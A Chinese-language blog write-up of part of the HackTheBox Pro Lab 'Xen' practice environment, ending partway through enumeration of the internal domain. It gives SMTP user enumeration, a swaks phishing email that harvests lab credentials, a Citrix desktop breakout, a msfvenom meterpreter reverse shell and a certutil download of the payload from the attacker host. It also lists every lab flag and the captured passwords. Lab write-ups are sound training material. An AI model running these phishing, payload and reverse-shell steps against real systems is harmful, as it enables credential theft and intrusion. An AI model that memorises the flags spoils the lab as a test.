---
title: HTB-Xen
description: 'Pro Labs-Xen'
pubDate: 2026-03-18
image: /Pro-Labs/Xen.png
categories:
  - Documentation
  - Hackthebox Prolabs
tags:
  - Hackthebox
  - Pro-Labs
---

![](/image/hackthebox-prolabs/Xen-1.png)

# Introduction
> Humongous Retail operates a nationwide chain of stores.  
巨型零售公司运营着遍布全国的连锁商店。
>
> The company has reacted to several recent skimming incidents by investing heavily in their POS systems. Keen to avoid any further negative publicity, they have engaged the services of a penetration testing company to assess the security of their perimeter and internal infrastructure.  
针对近期发生的几起盗刷事件，该公司已投入巨资升级其 POS 系统。为了避免进一步的负面宣传，他们还聘请了一家渗透测试公司来评估其网络边界和内部基础设施的安全状况。
>
> Xen is designed to put your skills in enumeration, breakout, lateral movement, and privilege escalation to the test within a small Active Directory environment.  
Xen 旨在小型 Active Directory 环境中测试您在枚举、突破、横向移动和权限提升方面的技能。
>
> The goal is to gain a foothold on the internal network, escalate privileges and ultimately compromise the domain while collecting several flags along the way.  
目标是在内部网络中站稳脚跟，提升权限，最终攻占该域，并在过程中收集多个标志。
>
>  Entry Point: `10.13.38.12`  
入口点： `10.13.38.12`
>

# Flag
```c
XEN{wh0_n33d5_2f@?}
XEN{7ru573d_1n574ll3r5}
XEN{l364cy_5pn5_ftw}
XEN{bu7_ld4p5_15_4_h455l3}
XEN{y_5h4r3d_p@55w0Rd5?}
XEN{d3r1v471v3_d0m41n_4dm1n}
```

# 入口信息收集
## 前置IP
```c
入口IP: 10.13.38.12
攻击机IP:10.10.16.26
```

## nmap扫描
```c
┌──(kali㉿kali)-[~]
└─$ nmap -sT -T4 10.13.38.12 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-04 12:11 CST
Nmap scan report for 10.13.38.12
Host is up (0.28s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE SERVICE
25/tcp  open  smtp
80/tcp  open  http
443/tcp open  https

Nmap done: 1 IP address (1 host up) scanned in 22.10 seconds

┌──(kali㉿kali)-[~]
└─$ nmap -sTCV -p25,80,443 10.13.38.12  
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-04 12:12 CST
Stats: 0:00:15 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 33.33% done; ETC: 12:13 (0:00:30 remaining)
Nmap scan report for 10.13.38.12
Host is up (0.33s latency).

PORT    STATE SERVICE  VERSION
25/tcp  open  smtp
| smtp-commands: CITRIX, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
| fingerprint-strings: 
|   GenericLines, GetRequest: 
|     220 ESMTP MAIL Service ready (EXCHANGE.HTB.LOCAL)
|     sequence of commands
|     sequence of commands
|   Hello: 
|     220 ESMTP MAIL Service ready (EXCHANGE.HTB.LOCAL)
|     EHLO Invalid domain address.
|   Help: 
|     220 ESMTP MAIL Service ready (EXCHANGE.HTB.LOCAL)
|     DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
|   NULL: 
|_    220 ESMTP MAIL Service ready (EXCHANGE.HTB.LOCAL)
80/tcp  open  http     Microsoft IIS httpd 7.5
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Did not follow redirect to https://humongousretail.com/
443/tcp open  ssl/http Microsoft IIS httpd 7.5
|_http-server-header: Microsoft-IIS/7.5
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC4_128_WITH_MD5
|_    SSL2_DES_192_EDE3_CBC_WITH_MD5
| ssl-cert: Subject: commonName=humongousretail.com
| Subject Alternative Name: DNS:humongousretail.com
| Not valid before: 2019-03-31T21:05:35
|_Not valid after:  2039-03-31T21:15:35
|_ssl-date: 2026-02-04T04:14:17+00:00; +2s from scanner time.
|_http-title: Did not follow redirect to https://humongousretail.com/
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port25-TCP:V=7.94SVN%I=7%D=2/4%Time=6982C727%P=x86_64-pc-linux-gnu%r(NU
SF:LL,33,"220\x20ESMTP\x20MAIL\x20Service\x20ready\x20\(EXCHANGE\.HTB\.LOC
SF:AL\)\r\n")%r(Hello,55,"220\x20ESMTP\x20MAIL\x20Service\x20ready\x20\(EX
SF:CHANGE\.HTB\.LOCAL\)\r\n501\x20EHLO\x20Invalid\x20domain\x20address\.\r
SF:\n")%r(Help,6F,"220\x20ESMTP\x20MAIL\x20Service\x20ready\x20\(EXCHANGE\
SF:.HTB\.LOCAL\)\r\n211\x20DATA\x20HELO\x20EHLO\x20MAIL\x20NOOP\x20QUIT\x2
SF:0RCPT\x20RSET\x20SAML\x20TURN\x20VRFY\r\n")%r(GenericLines,6F,"220\x20E
SF:SMTP\x20MAIL\x20Service\x20ready\x20\(EXCHANGE\.HTB\.LOCAL\)\r\n503\x20
SF:Bad\x20sequence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x20co
SF:mmands\r\n")%r(GetRequest,6F,"220\x20ESMTP\x20MAIL\x20Service\x20ready\
SF:x20\(EXCHANGE\.HTB\.LOCAL\)\r\n503\x20Bad\x20sequence\x20of\x20commands
SF:\r\n503\x20Bad\x20sequence\x20of\x20commands\r\n");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 1s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 123.01 seconds
```

# 10.13.38.12
## 80端口
访问80端口被重定向至[https://humongousretail.com](http://humongousretail.com/)

### 添加hosts
```c
10.13.38.12 humongousretail.com
```

然后访问[http://humongousretail.com/](http://humongousretail.com/)

![](/image/hackthebox-prolabs/Xen-2.png)

```c
Humongous Retail
👉 巨无霸零售 / 超大型零售商（偏营销名）

顶部导航
Offers：优惠
Experience：购物体验
Subscribe：订阅

头图（Hero 区域）
Seasonal Offers
👉 季节性优惠
From tableware to toys, decor to dresses, you'll find everything here
👉 从餐具到玩具，从装饰品到服装，你想要的一切这里都有
Save
👉 省钱 / 立省 / 优惠（按钮）
优惠商品区（Special offer items）
Special offer items
👉 特价商品
Prices reduced on hundreds of seasonal items, accessories, clothing, and picnicware
👉 数百种季节性商品、配饰、服装和野餐用品正在降价促销

购物体验（The Humongous Retail experience）
The Humongous Retail experience
👉 Humongous Retail 的购物体验
We have redefined shopping.
👉 我们重新定义了购物方式

四个特色模块：
Culinary Experiences
👉 餐饮体验
购物之余，来一杯精酿啤酒或现烘咖啡，搭配我们美味的餐食
Convenient Locations
👉 便利的门店位置
我们在所有主要城市和城镇都有门店，轻松找到你附近的 Humongous Retail
Speedy Service
👉 极速服务
你负责买，我们负责送。支持当天送达
Holiday Planning
👉 假期规划
买沙滩用品的同时，顺便把你的假期也安排好！

顾客评价（Heard at Humongous Retail...）
Heard at Humongous Retail...
👉 顾客在 Humongous Retail 这样说……
I like it here, the staff go out of their way to help you
👉 我很喜欢这里，员工会尽心尽力地帮助你
— I. Malone
The selection on offer is second to none
👉 商品选择无可挑剔
— Brenda

订阅区（Subscribe）
Subscribe
👉 订阅
Be the first to get our offers. As a thank you, we'll send you a 25% off voucher for your next shop!
👉 第一时间获取我们的优惠信息。作为感谢，我们将赠送你下一次购物 25% 折扣券！
Email
👉 邮箱
Subscribe now!
👉 立即订阅！

页脚（Footer）
Join the team
👉 加入我们（招聘邮箱）
We're hiring! We currently have vacancies in our store, retail distribution, sales and legal teams
👉 我们正在招聘！目前门店、物流配送、销售和法务团队都有空缺职位
```

```c
  <a href="mailto:jointheteam@humongousretail.com">Join the team</a>
```

### 子域名扫描
#### gobuster
```c
┌──(web)─(root㉿kali)-[/home/kali]
└─# gobuster dir -u http://humongousretail.com/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -t 40

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://humongousretail.com/
[+] Method:                  GET
[+] Threads:                 40
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/Images               (Status: 301) [Size: 157] [--> http://humongousretail.com/Images/]                  
/META-INF             (Status: 403) [Size: 1233]
/WEB-INF              (Status: 403) [Size: 1233]
/aspnet_client        (Status: 301) [Size: 164] [--> http://humongousretail.com/aspnet_client/]           
/css                  (Status: 301) [Size: 154] [--> http://humongousretail.com/css/]                     
/images               (Status: 301) [Size: 157] [--> http://humongousretail.com/images/]                  
/index.html           (Status: 200) [Size: 3433]
/jakarta              (Status: 401) [Size: 1293]
/js                   (Status: 301) [Size: 153] [--> http://humongousretail.com/js/]                      
/meta-inf             (Status: 403) [Size: 1233]
/remote               (Status: 301) [Size: 157] [--> http://humongousretail.com/remote/]                  
/web-inf              (Status: 403) [Size: 1233]
Progress: 4750 / 4750 (100.00%)
===============================================================
Finished
===============================================================
```

#### dirsearch
```c
┌──(web)─(root㉿kali)-[/home/kali]
└─# dirsearch -u http://humongousretail.com/
/root/.pyenv/versions/3.11.9/envs/web/lib/python3.11/site-packages/dirsearch/dirsearch.py:23: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3.post1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/reports/http_humongousretail.com/__26-02-04_12-31-27.txt

Target: http://humongousretail.com/

[12:31:27] Starting:                                                                                                    
[12:31:35] 301 -  153B  - /js  ->  http://humongousretail.com/js/                                                                                                                                                                            passwd                                                                                                                   
[12:32:17] 301 -  164B  - /aspnet_client  ->  http://humongousretail.com/aspnet_client/                                                                                                                                                        e/etc/passwd                                                                                                             
[12:32:29] 301 -  154B  - /css  ->  http://humongousretail.com/css/                                                                                                                 
[12:32:44] 301 -  157B  - /images  ->  http://humongousretail.com/images/                                                                                                           
[12:32:50] 200 -  879B  - /LICENSE.txt
[12:32:50] 200 -  879B  - /license.txt
[12:33:10] 200 -  197B  - /README.TXT
[12:33:10] 200 -  197B  - /ReadMe.txt
[12:33:10] 200 -  197B  - /Readme.txt
[12:33:10] 200 -  197B  - /README.txt
[12:33:10] 200 -  197B  - /readme.txt
Task Completed    
```

### 敏感信息
```c
<!--
Copyright (c) 2019 by Meike (https://codepen.io/schlenges/pen/mXvvLW)


Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
-->


许可声明
特此免费授予任何获得本软件及其相关文档文件（以下简称“软件”）副本的人以下权利：
在不受限制的情况下使用本软件，包括但不限于以下权利：
使用 复制 修改 合并 发布 分发 再许可 出售本软件的副本
并允许获得软件的人在满足以下条件的前提下行使上述权利。

使用条件
上述版权声明和本许可声明必须包含在本软件的所有副本或重要部分中。

免责声明
本软件按“原样（AS IS）”提供，不提供任何形式的明示或暗示担保，包括但不限于：
适销性 特定用途适用性 不侵权
在任何情况下，作者或版权持有人均不对因使用本软件或与本软件有关的使用、交易等行为而产生的任何索赔、损害或其他责任承担责任，无论该责任是基于合同、侵权或其他法律理论。
```

```c
A Pen created at CodePen.io. You can find this one at https://codepen.io/schlenges/pen/mXvvLW.

这是一个在 CodePen.io 上创建的 Pen（示例作品）。
你可以在这个链接找到它：https://codepen.io/schlenges/pen/mXvvLW
```

```c
I. Malone
Brenda
```

### /remote
![](/image/hackthebox-prolabs/Xen-3.png)

## smtp-user-enum
```c
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/xen]
└─# cat users
Malone
Brenda

┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/xen]
└─# smtp-user-enum -M RCPT -U users -t 10.13.38.12 -v
Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Mode ..................... RCPT
Worker Processes ......... 5
Usernames file ........... users
Target count ............. 1
Username count ........... 2
Target TCP port .......... 25
Query timeout ............ 5 secs
Target domain ............ 

######## Scan started at Wed Feb  4 13:58:01 2026 #########
10.13.38.12: Brenda <no such user>
10.13.38.12: Malone <no such user>
######## Scan completed at Wed Feb  4 13:58:04 2026 #########
0 results.

2 queries in 3 seconds (0.7 queries / sec)
```

```c
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/xen]
└─# smtp-user-enum -M RCPT -U /usr/share/seclists/Usernames/Honeypot-Captures/multiplesources-users-fabian-fingerle.de.txt -t 10.13.38.12 -v -D humongousretail.com -m 50 | grep -v "no such user"
Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Mode ..................... RCPT
Worker Processes ......... 50
Usernames file ........... /usr/share/seclists/Usernames/Honeypot-Captures/multiplesources-users-fabian-fingerle.de.txt
Target count ............. 1
Username count ........... 26324
Target TCP port .......... 25
Query timeout ............ 5 secs
Target domain ............ humongousretail.com

######## Scan started at Wed Feb  4 14:04:40 2026 #########
10.13.38.12: it@humongousretail.com exists
10.13.38.12: legal@humongousretail.com exists
10.13.38.12: marketing@humongousretail.com exists
10.13.38.12: sales@humongousretail.com exists
10.13.38.12: SALES@humongousretail.com exists
######## Scan completed at Wed Feb  4 14:19:00 2026 #########
5 results.

26324 queries in 860 seconds (30.6 queries / sec)
```

## Phishing for Creds
我们拿到了邮箱账号，且对方smtp邮箱开放，这里我们尝试自动凭据泄露

> swaks --to sales@humongousretail.com --from jointheteam@humongousretail.com --body "citrix [http://10.10.16.26/"](http://10.10.16.26/") --server humongousretail.com
>

这里swaks使用条件必须是需要俩个企业邮箱，所以前面的枚举是必不可少的

其次--body 传递的内容需要添加citrix，由于靶场靶机环境中不存在真人点击，因此需要**触发企业系统 / 客户端的自动行为，邮件触发者应当是**

+ Citrix 客户端
+ 浏览器插件
+ 内部自动化脚本
+ 邮件安全 / 链接检测组件

这些东西的特点是：

+ **会扫描邮件内容**
+ **会识别关键字**
+ **会主动访问 URL**

```c
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/xen]
└─# swaks --to sales@humongousretail.com --from jointheteam@humongousretail.com --body "citrix http://10.10.16.26/" --server humongousretail.com 
=== Trying humongousretail.com:25...
=== Connected to humongousretail.com.
<-  220 ESMTP MAIL Service ready (EXCHANGE.HTB.LOCAL)
 -> EHLO kali
<-  250-CITRIX
<-  250-SIZE 20480000
<-  250-AUTH LOGIN
<-  250 HELP
 -> MAIL FROM:<jointheteam@humongousretail.com>
<-  250 OK
 -> RCPT TO:<sales@humongousretail.com>
<-  250 OK
 -> DATA
<-  354 OK, send.
 -> Date: Wed, 04 Feb 2026 20:23:17 +0800
 -> To: sales@humongousretail.com
 -> From: jointheteam@humongousretail.com
 -> Subject: test Wed, 04 Feb 2026 20:23:17 +0800
 -> Message-Id: <20260204202317.294138@kali>
 -> X-Mailer: swaks v20240103.0 jetmore.org/john/code/swaks/
 -> 
 -> citrix http://10.10.16.26/
 -> 
 -> 
 -> .
<-  250 Queued (10.840 seconds)
 -> QUIT
<-  221 goodbye
=== Connection closed with remote host.
```

```c
┌──(web)─(root㉿kali)-[/home/kali]
└─# nc -lnvp 80
listening on [any] 80 ...
connect to [10.10.16.26] from (UNKNOWN) [10.13.38.12] 53794
POST /remote/auth/login.aspx?LoginType=Explicit&user=jmendes&password=VivaBARC3L0N@!!!&domain=HTB.LOCAL HTTP/1.1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36
Host: 10.10.16.26
Content-Length: 76
Expect: 100-continue
Connection: Keep-Alive

LoginType=Explicit&user=jmendes&password=VivaBARC3L0N%40!!!&domain=HTB.LOCAL
                                                     
┌──(web)─(root㉿kali)-[/home/kali]
└─# nc -lnvp 80
listening on [any] 80 ...
connect to [10.10.16.26] from (UNKNOWN) [10.13.38.12] 53802
POST /remote/auth/login.aspx?LoginType=Explicit&user=pmorgan&password=Summer1Summer!&domain=HTB.LOCAL HTTP/1.1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36
Host: 10.10.16.26
Content-Length: 72
Expect: 100-continue
Connection: Keep-Alive

LoginType=Explicit&user=pmorgan&password=Summer1Summer!&domain=HTB.LOCAL
                                                     
┌──(web)─(root㉿kali)-[/home/kali]
└─# nc -lnvp 80
listening on [any] 80 ...
connect to [10.10.16.26] from (UNKNOWN) [10.13.38.12] 53811
POST /remote/auth/login.aspx?LoginType=Explicit&user=awardel&password=@M3m3ntoM0ri@&domain=HTB.LOCAL HTTP/1.1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36
Host: 10.10.16.26
Content-Length: 75
Expect: 100-continue
Connection: Keep-Alive

LoginType=Explicit&user=awardel&password=%40M3m3ntoM0ri%40&domain=HTB.LOCAL
```

重复发送钓鱼邮件三次共获得三份凭据

+ jmendes /VivaBARC3L0N@!!!/HTB.LOCAL
+ awardel /@M3m3ntoM0ri@/HTB.LOCAL
+ pmorgan /Summer1Summer!/HTB.LOCAL

此举的目的应该是策划一场完整的网络钓鱼活动，克隆 Citrix 登录页面，然后向销售部门发送邮件，声称我们正在测试一个新的 Citrix URL，并利用该 URL 获取他们的凭据。估计是自动化流程直接跳过了这一步骤，直接发送了包含凭据的 POST 请求。

之所以需要三组凭据，大概因为一次只能有一个用户登录 Citrix，这样可以减少 HTB 玩家将其他人挤出桌面的可能性。

## Citrix Login
### 程序安装
![](/image/hackthebox-prolabs/Xen-4.png)

下载压缩包后解压

![](/image/hackthebox-prolabs/Xen-5.png)

### 依赖配置
```plain
┌──(web)─(root㉿kali)-[/home/kali/Downloads]
└─# ldd /usr/lib/ICAClient/wfica | grep "not found"
        libXaw.so.7 => not found
        libXt.so.6 => not found
        libX11.so.6 => not found
        libXinerama.so.1 => not found
        libXext.so.6 => not found
        libXrender.so.1 => not found


┌──(web)─(root㉿kali)-[/home/kali/Downloads]
└─# dpkg --add-architecture i386
apt update
apt install -y \
  libxaw7:i386 \
  libxt6:i386 \
  libx11-6:i386 \
  libxinerama1:i386 \
  libxext6:i386 \
  libxrender1:i386 \
  libice6:i386 \
  libsm6:i386 \
  libxpm4:i386 \
  libxmu6:i386 \
  libxmuu1:i386 \
  libc6:i386 \
  libstdc++6:i386 \
  zlib1g:i386 
```

### 网页登录
安装程序后点击跳转至登录界面

![](/image/hackthebox-prolabs/Xen-6.png)

输入所得凭据

![](/image/hackthebox-prolabs/Xen-7.png)

尝试通过凭据登录但是都失败了（都被人改了！！！！等环境重置了）

环境重置后输入凭据成功登录

点击Default机器，自动下载launch.ica

![](/image/hackthebox-prolabs/Xen-8.png)

### launch.ica
```plain
 /usr/lib/ICAClient/wfica ./launch.ica    

全屏模式下：通常 Shift + F2 是切换 Citrix 全屏和窗口模式。
先按 Shift + F2 回到窗口模式
再用窗口的关闭按钮退出或最小化

退出客户端：
Alt + F4 可以关闭当前窗口
```

## Getflag
远程控制桌面文件夹上存放flag.txt

![](/image/hackthebox-prolabs/Xen-9.png)

```plain
XEN{wh0_n33d5_2f@?}
```

# VDESKTOP2.HTB.LOCAL
## 权限提升
### 绕过受限桌面环境
Citrix 桌面无法直接从开始菜单访问 `cmd.exe` 或 `powershell.exe`

![](/image/hackthebox-prolabs/Xen-10.png)![](/image/hackthebox-prolabs/Xen-11.png)

#### 打开文件扩展名
![](/image/hackthebox-prolabs/Xen-12.png)![](/image/hackthebox-prolabs/Xen-13.png)

+ 打开 **“计算机”** 或任意文件夹。
+ 点击窗口顶部菜单栏的 **“组织”** → **“文件夹和搜索选项”**。
+ 在弹出的对话框里，切换到 **“查看”** 标签页。
+ 找到 **“隐藏已知文件类型的扩展名”**，把它的勾去掉。
+ 点击 **确定**。

#### cmd绕过
1. 右键创建文本文件
2. 双击文本文件，用记事本打开
3. 输入 `cmd.exe`
4. 保存为 `cmd.bat`
5. 双击 `cmd.bat`

![](/image/hackthebox-prolabs/Xen-14.png)

尝试ping我们攻击机IP，可以正常连同

### Msfconsole
#### 生成shell
```plain
┌──(kali㉿kali)-[~/Desktop/htb/rastalabs]
└─$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.32 LPORT=443 -f exe -o xen.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 7168 bytes
Saved as: xen.exe
```

```plain
msf > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(multi/handler) > set LHOST 10.10.16.32
LHOST => 10.10.16.32
msf exploit(multi/handler) > set LPORT 443
LPORT => 443
msf exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.10.16.32:443
```

#### 下载shell
```plain
updog -p 80
```

```plain
certutil.exe -urlcache -split -f http://10.10.16.32/xen.exe
```

```plain
meterpreter > getuid
Server username: HTB\awardel
```

成功反弹shell

### 信息收集
#### systeminfo
```plain
C:\Users\awardel\Desktop>systeminfo
systeminfo

Host Name:                 VDESKTOP1
OS Name:                   Microsoft Windows 7 Professional
OS Version:                6.1.7601 Service Pack 1 Build 7601
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Member Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:
Product ID:                00371-223-0897461-86526
Original Install Date:     2/11/2019, 8:13:39 AM
System Boot Time:          3/17/2026, 11:20:36 AM
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              2 Processor(s) Installed.
                           [01]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2445 Mhz
                           [02]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2445 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 11/12/2020
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+08:00) Perth
Total Physical Memory:     4,095 MB
Available Physical Memory: 3,290 MB
Virtual Memory: Max Size:  8,189 MB
Virtual Memory: Available: 7,374 MB
Virtual Memory: In Use:    815 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    htb.local
Logon Server:              \\DC
Hotfix(s):                 109 Hotfix(s) Installed.
                           [01]: KB2849697
                           [02]: KB2849696
                           [03]: KB2841134
                           [04]: KB2670838
                           [05]: KB971033
                           [06]: KB2479943
                           [07]: KB2491683
                           [08]: KB2506014
                           [09]: KB2506212
                           [10]: KB2533552
                           [11]: KB2534111
                           [12]: KB2552343
                           [13]: KB2564958
                           [14]: KB2579686
                           [15]: KB2585542
                           [16]: KB2604115
                           [17]: KB2621440
                           [18]: KB2631813
                           [19]: KB2653956
                           [20]: KB2654428
                           [21]: KB2667402
                           [22]: KB2685939
                           [23]: KB2690533
                           [24]: KB2698365
                           [25]: KB2705219
                           [26]: KB2706045
                           [27]: KB2727528
                           [28]: KB2729094
                           [29]: KB2729452
                           [30]: KB2736422
                           [31]: KB2742599
                           [32]: KB2758857
                           [33]: KB2770660
                           [34]: KB2786081
                           [35]: KB2807986
                           [36]: KB2813430
                           [37]: KB2834140
                           [38]: KB2836942
                           [39]: KB2836943
                           [40]: KB2840631
                           [41]: KB2847927
                           [42]: KB2861698
                           [43]: KB2862330
                           [44]: KB2862335
                           [45]: KB2864202
                           [46]: KB2868038
                           [47]: KB2871997
                           [48]: KB2882822
                           [49]: KB2884256
                           [50]: KB2893294
                           [51]: KB2894844
                           [52]: KB2900986
                           [53]: KB2911501
                           [54]: KB2931356
                           [55]: KB2937610
                           [56]: KB2943357
                           [57]: KB2952664
                           [58]: KB2968294
                           [59]: KB2972100
                           [60]: KB2972211
                           [61]: KB2973112
                           [62]: KB2973201
                           [63]: KB2977292
                           [64]: KB2978120
                           [65]: KB2984972
                           [66]: KB2991963
                           [67]: KB2992611
                           [68]: KB2999226
                           [69]: KB3000483
                           [70]: KB3004375
                           [71]: KB3010788
                           [72]: KB3011780
                           [73]: KB3021674
                           [74]: KB3023215
                           [75]: KB3030377
                           [76]: KB3035126
                           [77]: KB3037574
                           [78]: KB3045685
                           [79]: KB3046017
                           [80]: KB3046269
                           [81]: KB3059317
                           [82]: KB3060716
                           [83]: KB3071756
                           [84]: KB3074543
                           [85]: KB3075220
                           [86]: KB3078601
                           [87]: KB3093513
                           [88]: KB3097989
                           [89]: KB3108371
                           [90]: KB3109103
                           [91]: KB3109560
                           [92]: KB3110329
                           [93]: KB3122648
                           [94]: KB3124275
                           [95]: KB3126587
                           [96]: KB3138612
                           [97]: KB3138910
                           [98]: KB3139398
                           [99]: KB3139914
                           [100]: KB3150220
                           [101]: KB3155178
                           [102]: KB3156016
                           [103]: KB3159398
                           [104]: KB3161949
                           [105]: KB4019990
                           [106]: KB4040980
                           [107]: KB4483458
                           [108]: KB976902
                           [109]: KB4486563
Network Card(s):           2 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Local Area Connection 4
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 172.16.249.203
                                 [02]: fe80::7041:501c:3593:7440
                           [02]: vmxnet3 Ethernet Adapter
                                 Connection Name: Local Area Connection 5
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.13.38.13
                                 [02]: fe80::78d9:4a3f:be56:f2f3
                                 [03]: dead:beef::4152:13de:3d09:7d07
                                 [04]: dead:beef::78d9:4a3f:be56:f2f3
```

#### whoami /priv
```plain
C:\Users\awardel\Desktop>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled
```

 Bypass traverse checking(遍历文件夹时绕过权限检查)

####  whoami /groups  
```plain
C:\Users\awardel\Desktop>whoami /groups
whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                            Attributes
========================================== ================ ============================================== ==================================================
Everyone                                   Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE                   Well-known group S-1-5-4                                        Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                              Well-known group S-1-2-1                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
LOCAL                                      Well-known group S-1-2-0                                        Mandatory group, Enabled by default, Enabled group
HTB\Sales                                  Group            S-1-5-21-1943675722-3306049422-2153511175-1135 Mandatory group, Enabled by default, Enabled group
HTB\Citrix Users                           Group            S-1-5-21-1943675722-3306049422-2153511175-1141 Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity Well-known group S-1-18-1                                       Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192                                    Mandatory group, Enabled by default, Enabled group
```

#### HTB.LOCAL(dc.htb.local) IP
```plain
C:\Users\awardel\Desktop>ping HTB.LOCAL
ping HTB.LOCAL

Pinging HTB.LOCAL [172.16.249.200] with 32 bytes of data:
Reply from 172.16.249.200: bytes=32 time<1ms TTL=128

Ping statistics for 172.16.249.200:
    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),
Approximate round trip times in milli-seconds:
    Minimum = 0ms, Maximum = 0ms, Average = 0ms

C:\Users\jmendes\Desktop>ping dc.htb.local
ping dc.htb.local

Pinging DC.htb.local [172.16.249.200] with 32 bytes of data:
Reply from 172.16.249.200: bytes=32 time=1ms TTL=128

Ping statistics for 172.16.249.200:
    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),
Approximate round trip times in milli-seconds:
